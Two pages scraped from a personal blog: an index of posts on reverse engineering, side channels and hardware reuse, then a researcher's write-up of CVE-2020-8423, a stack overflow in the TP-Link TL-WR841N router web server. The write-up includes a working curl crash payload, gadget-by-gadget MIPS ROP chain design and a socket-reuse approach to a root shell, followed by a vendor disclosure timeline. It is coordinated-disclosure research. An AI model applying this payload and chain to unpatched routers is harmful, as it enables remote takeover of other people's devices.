=== Content from ktln2.org_2a55c58f_20250119_132704.html ===

[Skip to main content](#page-content)

* [![Gianluca Pacchiella](images/avatar.png)](https://ktln2.org/)

Notes and experiments. Don't expect much quality :P

# [Visual complex analysis: first chapter exercises](2024/visual-complex-analysis-1st-chapter-exercise/)

 [2023-12-24](2024/visual-complex-analysis-1st-chapter-exercise/)

Gianluca Pacchiella

[Comments](2024/visual-complex-analysis-1st-chapter-exercise/#disqus_thread)

"Visual complex analysis" it's a very good book, with really good exercises.

[Read moreâ¦](2024/visual-complex-analysis-1st-chapter-exercise/)

# [Abstract and symbolic execution notes (with possible application on reverse engineering)](2023/symbolic-execution-experiments/)

 [2022-08-26](2023/symbolic-execution-experiments/)

Gianluca Pacchiella

[Comments](2023/symbolic-execution-experiments/#disqus_thread)

This post will be probably a too ambitious one, since I'm going to write about a
very theoretical aspect of computation, in particular the so called **abstract
interpretation**: for now let me just say that this field tries to give the
*best possible answer* to unsolvable characterization of computer programs.

Another point of view that I want to address is the use of this kind of analysis
with reverse engineering, since a lot of aspects between these two kind of
analysis are shared.

This post will have pretty mathematical formalism but should be readable enough
also without a PhD.

[Read moreâ¦](2023/symbolic-execution-experiments/)

# [Reversing C++, Qt based applications using Ghidra](reversing-c%2B%2B-qt-applications-using-ghidra/)

 [2022-05-27](reversing-c%2B%2B-qt-applications-using-ghidra/)

Gianluca Pacchiella

[Comments](reversing-c%2B%2B-qt-applications-using-ghidra/#disqus_thread)

This post is going to be too ambitious probably: I want to introduce you to
reversing `C++` code, applying this knowledge in particular to `Qt`
applications and since we are at it, explaining some `ghidra` scripting to
automate the process.

[Read moreâ¦](reversing-c%2B%2B-qt-applications-using-ghidra/)

# [side channels: power analysis](experiments-around-side-channels/)

 [2022-03-19](experiments-around-side-channels/)

Gianluca Pacchiella

[Comments](experiments-around-side-channels/#disqus_thread)

This is a post in a serie regarding side channels, from the theoretical and
pratical point of view; the posts are

* introduction on the model of computing devices (to be finished)
* using the Chipwhisperer ([here](side-channels-using-the-chipwhisperer/))
* power analysis (this post)
* glitching (to be finished)

[Read moreâ¦](experiments-around-side-channels/)

# [side channels: using the chipwhisperer](side-channels-using-the-chipwhisperer/)

 [2022-03-02](side-channels-using-the-chipwhisperer/)

Gianluca Pacchiella

[Comments](side-channels-using-the-chipwhisperer/#disqus_thread)

This is a post in a series regarding side channels, from the theoretical and
pratical point of view; the posts are

* introduction on the model of computing devices (to be finished)
* using the Chipwhisperer (this post)
* power analysis ([here](experiments-around-side-channels/))
* glitching (to be finished)

[Read moreâ¦](side-channels-using-the-chipwhisperer/)

# [Reusing old shit: laptop keyboard](reusing-old-keyboard/)

 [2021-07-02](reusing-old-keyboard/)

Gianluca Pacchiella

[Comments](reusing-old-keyboard/#disqus_thread)

Here we are with another experiment in reusing otherwise trash-destined
electronics material; in this episode we are going to refurbish a keyboard,
from the recovering of the internal "matrix" to the design of the PCB destined
as the controller board, to finally reworking of an existing firmware to create
a new USB keyboard.

[Read moreâ¦](reusing-old-keyboard/)

# [blog migration to Nikola](blog-migration-to-nikola/)

 [2021-07-01](blog-migration-to-nikola/)

Gianluca Pacchiella

[Comments](blog-migration-to-nikola/#disqus_thread)

After running for a couple of years using `jekill` as a static site generator
I decided to switch to [`nikola`](https://getnikola.com/) for a couple of reasons: first of all because
is implemented in `python`, a language that I know more than `ruby` and this
allows me to improve the platform and customize it more to suite my needs.

[Read moreâ¦](blog-migration-to-nikola/)

# [Reusing old shit: creating a BSP using Yocto for the Samsung Galaxy S (S5PV210)](2021/01/31/yocto-samsung-galaxy-s/)

 [2021-01-31](2021/01/31/yocto-samsung-galaxy-s/)

Gianluca Pacchiella

[Comments](2021/01/31/yocto-samsung-galaxy-s/#disqus_thread)

In this post I'll describe my esperiments in reusing my old Samsung Galaxy S;
don't expected anything sophisticated, it's more a brain dump.

[Read moreâ¦](2021/01/31/yocto-samsung-galaxy-s/)

# [Reusing old shit: lcd screen](2021/01/31/reuse-old-laptop-screen/)

 [2021-01-31](2021/01/31/reuse-old-laptop-screen/)

Gianluca Pacchiella

[Comments](2021/01/31/reuse-old-laptop-screen/#disqus_thread)

It's happened in the past that someone gifted me of very old (and not working
anymore) laptops that otherwise would have been thrown in the garbage; my idea
for them was of reusing some parts that are more valuable: battery, disks,
keyboards, etc...

[Read moreâ¦](2021/01/31/reuse-old-laptop-screen/)

# [Modern cryptography: exercises chapter 3 'Private-key encryption'](2020/12/31/modern-crypto-exercises-chapter-3/)

 [2020-12-31](2020/12/31/modern-crypto-exercises-chapter-3/)

Gianluca Pacchiella

[Comments](2020/12/31/modern-crypto-exercises-chapter-3/#disqus_thread)

These are some solved exercises of chapter 3 of the book ["Introduction to
modern cryptography"](http://www.cs.umd.edu/~jkatz/imc.html) (second edition) by Jonathan Katz and Yehuda Lindell.
For chapter 2 go [here](2018/02/06/modern-crypto-exercise-chapter2/).

[Read moreâ¦](2020/12/31/modern-crypto-exercises-chapter-3/)

* [Older posts](index-6.html)

Contents Â© 2024 Gianluca Pacchiella - Powered by [Nikola](https://getnikola.com)



=== Content from ktln2.org_d64a758a_20250119_113731.html ===

[Skip to main content](#page-content)

* [![Gianluca Pacchiella](../../../../images/avatar.png)](https://ktln2.org/)

Notes and experiments. Don't expect much quality :P

# [CVE-2020-8423: exploiting the TP-LINK TL-WR841N V10 router](.)

 [2020-03-29](.)

Gianluca Pacchiella

[Comments](#disqus_thread)

 [Source](index.md)

### Tags:

* [CVE](../../../../categories/cve/)
* [exploit](../../../../categories/exploit/)
* [MIPS](../../../../categories/mips/)

In this post I'll explore the vulnerability that I found in the TL-WR841N
router, a MIPS device by TP-Link, during a code auditing and how I wrote an
exploit for it. To this vulnerability has been assigned the CVE-2020-8423.

### Assessment

I started studying the binary `httpd` that as usual in this kind of devices
is the main application running the administrative interface; if you want a
description of how I extracted the binary and runned it locally, jump to the
[section](#testing-environment) at the bottom of this post.

My workflow has been analyzing the functions included in the binary (in this
particular case I didn't have the source code so I used ghidra and its
decompiler to make sense of them) and taking note of their behaviour in order
to find something interesting (if you want a good book on vulnerability
assessment I advice the reading of "The art of software security assessment");
after a while I found the function below, a typical routine that handles
strings

```
int stringModify(char *dst,size_t size,char *src)

{
  char *src_plus_one;
  int index;
  char c;

  if ((dst == (char *)0x0) || (src_plus_one = src + 1, src == (char *)0x0)) {
    index = -1;
  }
  else {
    index = 0;
    while( true ) {
      c = src_plus_one[-1];
      if ((c == '\0') || ((int)size <= index)) break;
      if (c == '/') {
_escape:
        *dst = '\\';
_escape2:
        index = index + 1;
        dst = dst + 1;
_as_is:
        *dst = src_plus_one[-1];
        dst = dst + 1;
      }
      else {
        if ('/' < c) {
          if ((c == '>') || (c == '\\')) goto _escape;
          if (c == '<') {
            *dst = '\\';
            goto _escape2;
          }
          goto _as_is;
        }
        if (c != '\r') {
          if (c == '\"') goto _escape;
          if (c != '\n') goto _as_is;
        }
        if ((*src_plus_one != '\r') && (*src_plus_one != '\n')) {
          *dst = '<';
          dst[1] = 'b';
          dst[2] = 'r';
          dst[3] = '>';
          dst = dst + 4;
        }
      }
      index = index + 1;
      src_plus_one = src_plus_one + 1;
    }
    *dst = '\0';
  }
  return index;
}

```

it seems to escape some characters from a null terminated string with a size
passed as argument; in my notes I explained a little more about it

|  | Description |
| --- | --- |
| **Signature** | `int stringModify(char *dst,size_t size,char *src)` |
| **Description** | Escape the `src` buffer and put the contents in `dst` until it encounters a `NUL` byte or has consumed `size` bytes from the source buffer. The conversion consists in the escaping of `\`, `/`, `<`, `>`, `"`. A non consecutive newline is converted to `<br>`. |
| **Return value** | Return the number of bytes converted from the source or `-1` if `src` or `dst` are `NUL` |
| **Note** | It's not clear what are trying to do, maybe escaping `HTML`. The `dst` buffer should be at least three times larger of `src` to be sure it will fit. |

As you can read from the note section, it is vulneable to an out of bound writing with respect
to the destination buffer.

So if I can find a call to this function that uses as input a buffer from the
user and as destination a buffer in the stack I could try to come up with a
very interesting vulnerability.

After a while I found my target: the function `writePageParamSet()`
is used to print a value in the page and uses a buffer of 512 bytes
located in the stack big as the size limit passed to `stringModify()`

```
void writePageParamSet(request_t *req, char *fmt, char *value)

{
  int iVar1;
  char local_210 [512];

  if (value == (char *)0x0) {
    HTTP_DEBUG_PRINT("basicWeb/httpWebV3Common.c:178","Never Write NULL to page, %s, %d",
                     "writePageParamSet",0xb2);
  }
  iVar1 = strcmp(fmt,"\"%s\",");
  if (iVar1 == 0) {
    iVar1 = stringModify(local_210,0x200,value);
    if (iVar1 < 0) {
      printf("string modify error!");
      local_210[0] = '\0';
    }
    value = local_210;
  }
  else {
    iVar1 = strcmp(fmt,"%d,");
    if (iVar1 != 0) {
      return;
    }
    value = *(char **)value;
  }
  httpPrintf(req,fmt,value);
  return;
}

```

such function is used to print some values passed as `GET` parameters in the
"rendering" of a couple of pages: in particular in one of them there is some
code that is vulnerable (stripped down to the essential)

```
int userRpm_popupSiteSurveyRpm_AP.htm(request_t *req) {
    ...
    char local_buffer [68];
    ...
    memset(local_buffer,0,0x44);
    local_e1c = 0;
    value = httpGetEnv(req,"ssid");
    if (value == (dword *)0x0) {
      local_buffer[0] = '\0';
    }
    else {
      __n = strlen((char *)value);
      strncpy(local_buffer,(char *)value,__n);
    }
    value = httpGetEnv(req,"curRegion");
    if (value == (dword *)0x0) {
      local_buffer._36_4_ = 0x11;
    }
    else {
      local_e1c = atoi((char *)value);
      if (local_e1c < 0x6c) {
        local_buffer._36_4_ = local_e1c;
      }
    }
    value = httpGetEnv(req,"channel");
    if (value == (dword *)0x0) {
      local_buffer._40_4_ = 6;
    }
    else {
      local_e1c = atoi((char *)value);
      if (local_e1c - 1 < 0xf) {
        local_buffer._40_4_ = local_e1c;
      }
    }
    value = httpGetEnv(req,"chanWidth");
    if (value == (dword *)0x0) {
      local_buffer._44_4_ = 2;
    }
    else {
      local_e1c = atoi((char *)value);
      if (local_e1c - 1 < 3) {
        local_buffer._44_4_ = local_e1c;
      }
    }
    value = httpGetEnv(req,"mode");
    if (value == (dword *)0x0) {
      local_buffer._48_4_ = 1;
    }
    else {
      local_e1c = atoi((char *)value);
      if (local_e1c - 1 < 8) {
        local_buffer._48_4_ = local_e1c;
      }
    }
    value = httpGetEnv(req,"wrr");
    if (value != (dword *)0x0) {
      iVar1 = strcmp((char *)value,"true");
      if ((iVar1 == 0) || (iVar1 = atoi((char *)value), iVar1 == 1)) {
        local_buffer._52_4_ = 1;
      }
      else {
        local_buffer._52_4_ = 0;
      }
    }
    value = httpGetEnv(req,"sb");
    if (value != (dword *)0x0) {
      iVar1 = strcmp((char *)value,"true");
      if ((iVar1 == 0) || (iVar1 = atoi((char *)value), iVar1 == 1)) {
        local_buffer._56_4_ = 1;
      }
      else {
        local_buffer._56_4_ = 0;
      }
    }
    value = httpGetEnv(req,"select");
    if (value != (dword *)0x0) {
      iVar1 = strcmp((char *)value,"true");
      if ((iVar1 == 0) || (iVar1 = atoi((char *)value), iVar1 == 1)) {
        local_buffer._60_4_ = 1;
      }
      else {
        local_buffer._60_4_ = 0;
      }
    }
    value = httpGetEnv(req,"rate");
    if (value != (dword *)0x0) {
      local_buffer._64_4_ = atoi((char *)value);
    }
    httpPrintf(req,
               "<SCRIPT language=\"javascript\" type=\"text/javascript\">\nvar %s = new Array(\n",
               "pagePara");
    writePageParamSet(req,"\"%s\",",local_buffer);
    writePageParamSet(req,"%d,",local_buffer + 0x24);
    writePageParamSet(req,"%d,",local_buffer + 0x28);
    writePageParamSet(req,"%d,",local_buffer + 0x2c);
    writePageParamSet(req,"%d,",local_buffer + 0x30);
    writePageParamSet(req,"%d,",local_buffer + 0x34);
    writePageParamSet(req,"%d,",local_buffer + 0x38);
    writePageParamSet(req,"%d,",local_buffer + 0x3c);
    writePageParamSet(req,"%d,",local_buffer + 0x40);
    httpPrintf(req,"0,0 );\n</SCRIPT>\n");
    ...
}

```

The buffer named here `local_buffer` has size 68 and
contains the value for the parameters that will be printed;
the organization in memory is the following

```
0x00  |             |
      | ssid        |
      |             |
0x24  | curRegion   |
0x28  | channel     |
0x2c  | chanWidth   |
0x30  | mode        |
0x34  | wrr         |
0x38  | sb          |
0x3c  | select      |
0x40  | rate        |
 ...
0x??  | return addr |

```

this complicates a little the exploiting since these parameters
can set some `NUL` bytes along the way, but don't worry, the way
in which they are handled allows me to specify values that do not
set bytes, for example

```
    value = httpGetEnv(req,"mode");
    if (value == (dword *)0x0) {
      local_buffer._48_4_ = 1;
    }
    else {
      local_e1c = atoi((char *)value);
      if (local_e1c - 1 < 8) {
        local_buffer._48_4_ = local_e1c;
      }
    }

```

if is not set `mode` then the value `0x00000001` is placed in the stack
(and this is a problem since contains `NUL` bytes); any value less than 8
is used as value but obviously, for the same reason, I don't want that. The
bypass is simply to use a bigger value to avoid anything to be written in
the stack, for example `mode=1000`.

Now I have all the pieces in place and I can try a simple proof of concept.

### PoC

If I do a simple `GET` request with a payload big enough

```
$ curl \
    -H 'Cookie: Authorization='$BASE \
    'http://localhost:8080/'$ROOT'/userRpm/popupSiteSurveyRpm_AP.htm?\
    mode=1000&curRegion=1000&chanWidth=100&channel=1000&\
ssid='$(python -c 'print( "/%0A"*0x55 + "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac")')

```

I obtain the following crash:

```
#0  0x61616561 in ?? ()
(gdb) i r
          zero       at       v0       v1       a0       a1       a2       a3
 R0   00000000 00000001 00000000 00000302 7d7fe878 00560000 00000002 00000000
            t0       t1       t2       t3       t4       t5       t6       t7
 R8   00000000 00000000 00000000 86ffa000 00000000 7e1ffc14 61636661 00000000
            s0       s1       s2       s3       s4       s5       s6       s7
 R16  61616261 61616361 61616461 00000005 00000000 00000007 00000000 0064c804
            t8       t9       k0       k1       gp       sp       s8       ra
 R24  00000000 2aad2980 00000000 00000000 00594d80 7d7fed50 7d7fedf8 61616561
            sr       lo       hi      bad    cause       pc
      0000a413 2deb3800 0000e72b 61616560 10800008 61616561
           fsr      fir
      00000000 00000000

```

that corresponds to the following offsets for the registers we control

* `s0` -> 3
* `s1` -> 7
* `s2` -> 11
* `pc` -> 15
* `t6` -> too far away

and indeed analyzing the assembly of the epilogue for `writePageParamSet()`
all corresponds

```
lw                 ra,local_4(sp)
lw                 s2,local_8(sp)
lw                 s1,local_c(sp)
lw                 s0,local_10(sp)
jr                 ra
_addiu             sp,sp,0x228

```

In order to have a mental model and build an exploit, I start making
a diagram of the memory

```
 ---- increasing addresses ---->

[   padding   ][  s0  ][  s1  ][  s2  ][  ra  ][   ?????   ]
                                                |
  sp points here after the oveflow  ------------'

```
### Ropchain

This is a router running on a kernel 2.6.31 without any
protection: the stack is **executable**, the address layout is
**not randomized** and obviously is **running as root** so
this is plain exercise from the 90s.

The way I choose to build my weird machine is via **return
oriented programming**, i.e. I try to find sequences of instructions
already present in the executable address space of the process
that terminate with a jump controllable from the attacker; these fragments are
called **gadgets**.

So, let's look what is at our disposal in the
address space of the process: `gdb` gives me the following information

```
process 5886
cmdline = 'httpd'
cwd = '/tl-rootfs/tmp'
exe = '/tl-rootfs/usr/bin/httpd'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
          0x400000   0x561000   0x161000          0      /tl-rootfs/usr/bin/httpd
          0x571000   0x590000    0x1f000   0x161000      /tl-rootfs/usr/bin/httpd
          0x590000   0x66e000    0xde000          0           [heap]
        ...
        0x2aaf3000 0x2ab50000    0x5d000          0      /tl-rootfs/lib/libc.so.0
        0x2ab50000 0x2ab5f000     0xf000          0
        0x2ab5f000 0x2ab60000     0x1000    0x5c000      /tl-rootfs/lib/libc.so.0
        0x2ab60000 0x2ab61000     0x1000    0x5d000      /tl-rootfs/lib/libc.so.0
        ...

```

We are lucky that this application loads a lot of libraries, but how we'll see
I'll use only the `libc` (in particular this is uClib) so our base address
to look for gadgets is `0x2aaf3000`. There are a few of tools that can help
in finding gadgets, like `ROPgadget`.

Now it's time to build our rop chain: first of all we start to take remedy
of cache incohorency: the architecture used for this device is **MIPS** and
has a particularity, some regions of memory are cached and need to be flushed
in order to make our ropchain in the stack working.

The old trick is to call `sleep()` and in our case we can use the value
inside `s3` that I don't control (in this case equals to 5) so set the argument
for call; this is the gadget used

```
 move $t9, $s1 ;
 jalr $t9 ;
 move $a0, $s3

```

this is equivalent to `$a0=5` and `jmp $s1` (remember, we control `$s1`).

**Note:** another particularity of `MIPS` is the [**branch delay slot**](https://en.wikipedia.org/wiki/Delay_slot),
when an instruction involving a jump is executed, the following instruction is also
executed before reaching the destination. This explain why is included
also one more instruction after a jump in our gadgets.

Since a function call will use the value into `ra` to return back we need to
find a gadget that sets that register and jump via another register. This is
not difficult to find, I think a lot of function epilogues are similar to
the following:

```
 move $t9, $s2 ;
 lw $ra, 0x24($sp) ;
 lw $s2, 0x20($sp) ;
 lw $s1, 0x1c($sp) ;
 lw $s0, 0x18($sp) ;
 jr $t9 ;
 addiu $sp, $sp, 0x28

```

this is equivalento to `ra=0x24(sp), sp+=0x28, jmp $s2`.

The plus side is that we can reload the registers with other values just in case
is necessary. Also the stack is moved further up (fortunately we have space to spare).

The updated situation in our buffer is the following:

```
 ---- increasing addresses ---->
                                               ,---- 0x18 ----.
[   padding   ][  s0  ][  s1  ][  s2  ][  ra  ][    unused    ][  s0  ][  s1  ][  s2  ][  ra  ][ ????
                                                |                                              |
  sp points here at the beginning   ------------'      sp points here at the end   ------------'

```

Since the stack is executable I can act like it's 90s again and jump into it
to execute something; this gadget loads in `v0` the stack's address with an offset
and jump where the value of `s0` points to (also writes `v0` back in the stack
but fortunately at an offset that doesn't interfere with our stack juggling)

```
 addiu $v0, $sp, 0x40 ;
 ori $a1, $zero, 0x8912 ;
 addiu $a2, $sp, 0x18 ;
 move $t9, $s0 ;
 jalr $t9 ;
 sw $v0, 0x1c($sp)

```

and then, finally, we can jump to `v0` (i.e. inside the stack) with the simplest of all the gadgets:

```
 jr $v0 ;
 nop

```

The memory now looks something like this

```
 ---- increasing addresses ---->
                                               ,---- 0x18 ----.                                ,---- 0x40 ----.
[   padding   ][  s0  ][  s1  ][  s2  ][  ra  ][    unused    ][  s0  ][  s1  ][  s2  ][  ra  ][    unused    ][ shellcode...
                                                                                               |
                                                                    sp points here ------------'

```
### Shellcode - 1st blood

Arrived at this point we can write the code as we like it since we have total
control, a part from the little annoying escaping thing.

At first I tried the following [Reverse TCP Shellcode (181 bytes)](https://www.exploit-db.com/exploits/45541)
but as you can see it contains sequences like following

```
\x3c\x0e\x11\x5d      # lui     $t6, 0x115d ( sin_port = 4445 )

```

with the byte `0x3c` (`<`) that is escaped by the `stringModify()`;
there are a couple of workarounds to fix that but are out of scope for this post.

At the point I tried the shellcode but failed because I didn't have
enough space: the vulnerable function copies `0x200` bytes as maximum from the source buffer,
taking into account that we used `0x55*len('/\n') = 0xaa` bytes we have `0x156` to use
(including the various registers to set in the ropchain) we must remove 0x18 + 0x40 + 0x10 that
are unusable.

Strange fact is that it kinda works because when I trigger it the netcat
receives the log from the main thread, the log that I see from the terminal
from where I launched `httpd`; my educated guess is that the shellcode stops
just after having duplicated the file descriptors but before creating
the "reverse" connection to my machine.

### Use the source Luke

This mistake reminds me that in reality I don't need to open a connection,
I have already a connection opened: the one that I'm using to send the exploit!

Now the tricky part: I would like to find a point where the socket
is used and if there is any reminiscence of it in the stack; after a little
digging using `ghidra` I finally found a way! Bear with me.

If we analyze the instructions we see that when the `writePageParamSet()`
function is called the `req` instance is passed via the register `s7`;
after that, internally, `stringModify()` is called (that causes the overflow),
and at the same frame is called `httpPrintf()`.

Fortunately one of the inner calls stores `s7` in the stack! The following
diagram tries to explain the concept

```
int userRpm_popupSiteSurveyRpm_AP(request_t* req)
    lui                a1,0x54
    addiu              a1=>s_"%s",_00544d38,a1,0x4d38                   = "\"%s\","
    lw                 t9,-0x5694(gp)=>->writePageParamSet              = 0043bba0
    move               a0,s7
    addiu              a2,sp,0xcc
    jalr               t9=>writePageParamSet

    void writePageParamSet(request_t *req,char *fmt,char *value)
        addiu              sp,sp,-0x228

        int stringModify(char *dst,size_t size,char *src)
        int httpPrintf(request_t *req,char *fmt,...)
            addiu              sp,sp,-0x28
            lw                 a0,0x34(a0) ; a0 = req->socket

            int wmnetSocketVprintf(int fd,char *fmt,va_list vaList,int *nWrite)
                addiu              sp,sp,-0x20

                int vfdprintf(int fd,char *fmt,va_list list)
                    addiu              sp,sp,-0x210
                    sw                 ra,0x20c(sp)
                    sw                 s8,0x208(sp)
                    sw                 s7,0x204(sp)
                    sw                 s6,0x200(sp)

```

Since is all deterministic, we can add the offsets and find out where the
`req` address is stored, i.e. `-0x480 + 0x204` bytes from where the stack
pointer is when we control the `pc` register; Let me double check
with `gdb` in a running instance:

```
(gdb) print/x 0x228 + 0x28 + 0x20 + 0x210
$4 = 0x480
(gdb) x/10xw (int*)($sp - 0x480 + 0x204)
0x7d3fead4:     0x0064c804      0x7d3fedf8      0x0050cf0c      0x00544d3d
0x7d3feae4:     0x00000000      0x7d3fed44      0x0000000e      0x00594d80
0x7d3feaf4:     0x0051fc64      0x7d3fee1c

```

`0x0064c804` indeed is a value of memory located in the **heap**
(to confirm this take a look at the mapped address space at the beginning);
now we can add the offset to reach the `socket` variabile inside `req`
i.e. `0x34` (this is not obvious of course, you should have reversed the internal
members of this structure)

```
(gdb) x/xw (*(int*)($sp - 0x480 + 0x204) + 0x34)
0x64c838:       0x0000000e

```

To double check that this file descriptor makes sense we can dig more information
inside the `/proc` pseudo filesystem

```
(gdb) info proc
process 25517
cmdline = 'httpd'
cwd = '/tl-rootfs/tmp'
exe = '/tl-rootfs/usr/bin/httpd'
(gdb) shell ls -al /proc/25517/fd
fd/     fdinfo/
(gdb) shell ls -al /proc/25517/fd/
total 0
dr-x------ 2 root root  0 Jan 21 09:05 .
dr-xr-xr-x 6 root root  0 Jan 21 06:03 ..
lrwx------ 1 root root 64 Jan 21 09:21 0 -> /dev/ttyS0
lrwx------ 1 root root 64 Jan 21 09:21 1 -> /dev/ttyS0
lrwx------ 1 root root 64 Jan 21 09:21 10 -> socket:[3149]
lr-x------ 1 root root 64 Jan 21 09:21 11 -> /tl-rootfs/tmp/pipe_mud80
l-wx------ 1 root root 64 Jan 21 09:21 12 -> /tl-rootfs/tmp/pipe_mud80
lrwx------ 1 root root 64 Jan 21 09:21 13 -> socket:[3150]
lrwx------ 1 root root 64 Jan 21 09:21 14 -> socket:[18959]
   ...

```

The number between square brackets is the **inode** value that
we can use via another entry in `/proc` to find more information
(we are looking at the inode 18959)

```
(gdb) shell cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   ...
   5: 0A00020F:0050 0A000202:8614 01 00000000:00000000 00:00000000 00000000     0        0 18959 1 86cf0d60 21 4 1 5 -1
   ...
(gdb) print/d 0x50
$5 = 80

```

It seems legit! Obviously we need to subtract also `0x28` from the stack pointer if we want
to use it from inside the shellcode.

And at the end we can build out exploit and launch it

```
 1599 ttyS0    Ss     0:00 /bin/login --
 1600 ttyS0    S      0:01  \_ -bash
 1615 ttyS0    S+     0:00      \_ bin/sh
26457 ttyS0    S+     0:11          \_ httpd
26458 ttyS0    S+     0:00              \_ httpd
26459 ttyS0    S+     0:00                  \_ httpd
26506 ttyS0    S+     0:00                  \_ httpd
  ...
18382 ttyS0    S+     0:03                  \_ httpd
18384 ttyS0    S+     0:00                  \_ sh

```

a beautiful `sh` session spawned from `httpd` :)

This wraps up the explanation of the exploitation, here
a video with a live demonstration:

### Timeline of disclosure

I contacted the vendor that acknowledged the vulnerability and fixed it

* 23/01/2020: first contact with the security team of TP-Link
* 31/01/2020: I sent them a report with the vulnerability
* 17/02/2020: TP-Link security team asked for a video showing the PoC
* 19/02/2020: I sent them the video
* 04/03/2020: TP-Link security team sent me a fixed firmware to check
* 25/03/2020: TP-Link released the new firmware
* 30/03/2020: public disclosure with this post

### Testing environment

All of what I did was using qemu although I had the device
for obvious practical reasons but if you want it's possible
to upload a `gdb-server` on the router using `tftp`,
bad enough you need access via serial

```
(laptop) $ pip3 install --user ptftpd
(laptop) $ ptftpd -p 4444 enp8s0 -v .
(router) # tftp -g -r gdb-server -l /tmp/gdb-server 192.168.0.100 4444

```

a little easier is to download the firmware directly from the product
page and analyze/unpack it: using `binwalk` is possible to
see the parts composing the firmware

```
$ binwalk TL-WR841N/wr841nv10_wr841ndv10_en_3_16_9_up_boot\(150310\).bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             TP-Link firmware header, firmware version: 0.-15473.3, image version: "", product ID: 0x0, product version: 138477584, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 761358, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
13440         0x3480          U-Boot version string, "U-Boot 1.1.4 (Mar 10 2015 - 15:00:39)"
13488         0x34B0          CRC32 polynomial table, big endian
14800         0x39D0          uImage header, header size: 64 bytes, header CRC: 0x8E2B46CA, created: 2015-03-10 07:00:39, image size: 35711 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x72C78246, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: "u-boot image"
14864         0x3A10          LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 93256 bytes
131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version: "", product ID: 0x0, product version: 138477584, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 761358, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2219160 bytes
1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2477651 bytes, 560 inodes, blocksize: 131072 bytes, created: 2015-03-10 07:25:11

```

for the following steps we need only to unpack the root filesystem.

#### Kernel

In this case I need to build my own kernel since the ones that I found online were
crashing when I attached `gdb`: the instructions are pretty trivial
but I forgot every time them so here we go

```
$ export ARCH=mips
$ export CROSS_COMPILE=mips-linux-gnu
$ export PATH=/path/to/toolchain/bin/:$PATH
$ make malta_defconfig
$ make menuconfig
  < select BIG ENDIAN >
$ make -j 8
$ make modules_install INSTALL_MOD_PATH=/somewhere/

```

remember that if you receive an error like

```
include/linux/compiler-gcc.h:86:1: fatal error: linux/compiler-gcc8.h: File o directory non esistente
 #include gcc_header(__GNUC__)

```

you can look at the directory `include/linux/` and find the files `compile-gccX` that tell
you which version of `gcc` is the most probable to build without errors. In my case I used
the [Sourcery toolchain](https://sourcery.mentor.com/GNUToolchain/release1872).

In case you need to copy the modules over the guest

```
$ rsync  --progress \
    -ahe "ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null" \
    /somewhere/lib/modules/2.6.31 root@127.0.0.1:/lib/modules/

```
#### Qemu

The final step is starting qemu, copying the root filesystem and run
the `httpd` daemon into a `chroot`

```
$ qemu-system-mips \
    -M malta \
    -kernel linux-2.6.31/vmlinux \
    -hda mips/debian_squeeze_mips_standard.qcow2 \
    -append "root=/dev/hda1 console=ttyS0" \
    -nographic \
    -serial mon:stdio \
    -nic user,hostfwd=tcp::2222-:22,hostfwd=tcp::8080-:80
Linux version 2.6.31 (gipi@turing) (gcc version 4.5.2 (Sourcery CodeBench Lite 2011.03-93) ) #2 SMP Tue Jan 14 12:33:40 CET 2020

LINUX started...
console [early0] enabled
CPU revision is: 00019300 (MIPS 24Kc)
FPU revision is: 00739300
registering PCI controller with io_map_base unset
Determined physical RAM map:
 memory: 00001000 @ 00000000 (reserved)
 memory: 000ef000 @ 00001000 (ROM data)
 memory: 003ec000 @ 000f0000 (reserved)
 memory: 07b23000 @ 004dc000 (usable)
 ...
Starting MTA:Starting OpenBSD Secure Shell server: sshd.
 exim4.

Debian GNU/Linux 6.0 debian-mips ttyS0

debian-mips login: root
Password:
   ...
root@debian-mips:~#

```

This starts our emulation machine and allows connection for `ssh` from
port 2222 and expose the web interface at port 8080; now we can connect
with

```
$ ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@127.0.0.1
Warning: Permanently added '[127.0.0.1]:2222' (RSA) to the list of known hosts.
root@127.0.0.1's password:
   ...
root@TL-WR841N:~#

```

Now I can copy the root filesystem, `mount` the `proc` filesystem
and `chroot` in it

```
root@debian-mips:~# mount --bind /proc /tl-rootfs/proc/
root@debian-mips:~# chroot /tl-rootfs/ bin/sh

BusyBox v1.01 (2015.03.10-07:17+0000) Built-in shell (msh)
Enter 'help' for a list of built-in commands.

# export LD_PRELOAD=/hook-mips.so
# httpd
read_from_configflash: ioctl failed: Inappropriate ioctl for device
============Firmware version check failed=============
read_from_configflash: ioctl failed: Inappropriate ioctl for device
   ...
HOOK: system( "rm -rf /var/log" ) returned 1137
HOOK: system( "syslogd -C -l 7 &" ) returned 1137
HOOK: system( "klogd &" ) returned 1137
   ...

```

Obviously out of the box `httpd` is not going to work since
some device files are not present but it's possible to use the `LD_PRELOAD`
mechanism and trick the daemon, in particular I intercepted the `system()`
and `fork()` calls to avoid the network configuration to happen.

### Debug

A few tricks for `gdb`: remember to set `nostop` for `SIGPIPE`

```
(gdb) handle SIGPIPE nostop noprint pass
Signal        Stop      Print   Pass to program Description
SIGPIPE       No        No      Yes             Broken pipe

```

use `display` to show the instruction you are executing
when stopped

```
